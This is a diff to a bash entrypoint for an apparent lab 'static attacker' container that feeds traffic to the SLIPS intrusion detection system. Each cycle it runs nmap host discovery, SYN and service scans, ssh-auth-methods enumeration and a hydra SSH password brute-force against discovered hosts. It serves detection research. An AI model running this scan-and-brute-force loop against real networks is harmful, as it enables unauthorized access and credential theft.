@@ -1,10 +1,11 @@
 #!/bin/bash
 # Static attacker entrypoint — deterministic, mechanical, high-cadence.
-# Every ATTACK_INTERVAL seconds (default 60) it runs a fresh nmap -sS -A sweep
-# of its subnet, an SSH discovery that also enumerates auth methods
-# (ssh-auth-methods NSE), and a hydra SSH brute pass driven with curated
-# user/pass lists. (The one-time -sn discovery sweep and the per-cycle -sT
-# connect sweep were dropped — they did not shift the traffic fractions.)
+# Each ATTACK_INTERVAL seconds (default 60) it runs ONE nmap -sn host-discovery
+# sweep of its subnet — the cycle's single ARP burst — then a -sS -sV service
+# sweep and an ssh-auth-methods + hydra pass against ONLY the discovered hosts.
+# The post-discovery scans are sent at the IP layer (--send-ip) / as TCP
+# connects, so the kernel resolves MACs from the cache the -sn warmed instead of
+# re-ARPing the subnet: ARP stays ~one sweep per minute, not one per scan pass.
 #
 # Why this cadence: SLIPS fires alerts per (profile, timewindow) — fresh
 # nmap evidence arriving each minute keeps every TW's attack-labelling alive
@@ -49,35 +50,45 @@ echo "[static-attacker] attack phase started — engaging" | tee -a "$LOG"
 
 while true; do
   cycle=$(date -u +%F\ %T)
-  echo "===== $cycle sweep $SUBNET (nmap -sS -sV --script=default, top ${TOP_PORTS} ports) =====" >> "$LOG"
-  # SYN scan + service/script detection of the subnet: feeds SLIPS's
-  # portscan/service alerts. We use -sV --script=default instead of -A so OS
-  # detection (-O) is off - its UDP probe was the attacker's only UDP traffic.
-  nmap -sS -sV --script=default -T4 \
-    --top-ports "$TOP_PORTS" \
+  # ONE ARP sweep per cycle: on-link host discovery (nmap -sn) ARP-resolves the
+  # subnet, warming the kernel ARP cache and yielding the live-host list. This
+  # is the only subnet-wide pass; everything below targets just these hosts.
+  echo "===== $cycle host discovery $SUBNET (nmap -sn — the cycle's one ARP sweep) =====" >> "$LOG"
+  nmap -sn -T4 -oG /tmp/live.gnmap \
     --exclude 127.0.0.0/8,localhost \
     "$SUBNET" >> "$LOG" 2>&1 || true
+  awk '/Status: Up/{print $2}' /tmp/live.gnmap > /tmp/live_hosts.txt 2>/dev/null || : > /tmp/live_hosts.txt
+  nlive=$(wc -l < /tmp/live_hosts.txt 2>/dev/null || echo 0)
+  echo "-- $nlive live hosts discovered" >> "$LOG"
+  if [ "$nlive" -gt 0 ]; then
+    echo "===== $cycle sweep live hosts (nmap -sS -sV --script=default, top ${TOP_PORTS}; --send-ip, warm cache = no re-ARP) =====" >> "$LOG"
+    # SYN scan + service/script detection of the discovered hosts, sent at the
+    # IP layer (--send-ip) with discovery off (-Pn): the kernel resolves MACs
+    # from the warmed cache, so no new ARP sweep. Feeds SLIPS portscan/service.
+    nmap -sS -sV --script=default -T4 \
+      --top-ports "$TOP_PORTS" --send-ip -n -Pn \
+      -iL /tmp/live_hosts.txt >> "$LOG" 2>&1 || true
 
-  echo "===== $cycle ssh discovery + auth-methods $SUBNET (nmap --script ssh-auth-methods) =====" >> "$LOG"
-  # SSH discovery that also enumerates each server's accepted auth methods
-  # (ssh-auth-methods NSE; needs a full TCP connection, hence -sT). Normal
-  # output (incl. the script result) goes to the log; the greppable copy to a
-  # file feeds the hydra target list. nmap's ssh-brute NSE stays unused in this
-  # image (libssh2 handshake error vs OpenSSH >=8.9), so hydra does the brute.
-  nmap -sT -T4 -p 22 --open --script ssh-auth-methods \
-    -oG /tmp/ssh_targets.gnmap \
-    --exclude 127.0.0.0/8,localhost \
-    "$SUBNET" >> "$LOG" 2>&1 || true
-  awk '/22\/open/ {print $2}' /tmp/ssh_targets.gnmap > /tmp/ssh_targets.txt 2>/dev/null || : > /tmp/ssh_targets.txt
-  if [ -s /tmp/ssh_targets.txt ]; then
-    while read -r host; do
-      [ -n "$host" ] || continue
-      echo "-- hydra ssh://$host (users=/root/users.txt, passes=passwords.lst)" >> "$LOG"
-      timeout 45 hydra -L /root/users.txt -P "$PASSDB" \
-        -t 4 -f -V "ssh://$host" >> "$LOG" 2>&1 || true
-    done < /tmp/ssh_targets.txt
+    echo "===== $cycle ssh discovery + auth-methods (nmap -sT -p22 connect, warm cache) =====" >> "$LOG"
+    # TCP connect scan (kernel sockets → ARP cache, no sweep) that also runs the
+    # ssh-auth-methods NSE; the greppable copy feeds the hydra target list.
+    # nmap's ssh-brute NSE stays unused in this image (libssh2 vs OpenSSH >=8.9).
+    nmap -sT -T4 -p 22 --open -n -Pn --script ssh-auth-methods \
+      -oG /tmp/ssh_targets.gnmap \
+      -iL /tmp/live_hosts.txt >> "$LOG" 2>&1 || true
+    awk '/22\/open/ {print $2}' /tmp/ssh_targets.gnmap > /tmp/ssh_targets.txt 2>/dev/null || : > /tmp/ssh_targets.txt
+    if [ -s /tmp/ssh_targets.txt ]; then
+      while read -r host; do
+        [ -n "$host" ] || continue
+        echo "-- hydra ssh://$host (users=/root/users.txt, passes=passwords.lst)" >> "$LOG"
+        timeout 45 hydra -L /root/users.txt -P "$PASSDB" \
+          -t 4 -f -V "ssh://$host" >> "$LOG" 2>&1 || true
+      done < /tmp/ssh_targets.txt
+    else
+      echo "-- no ssh services found" >> "$LOG"
+    fi
   else
-    echo "-- no ssh services found on $SUBNET" >> "$LOG"
+    echo "-- no live hosts discovered this cycle" >> "$LOG"
   fi
   echo "===== cycle done $(date -u +%F\ %T) =====" >> "$LOG"
   sleep "$INTERVAL"
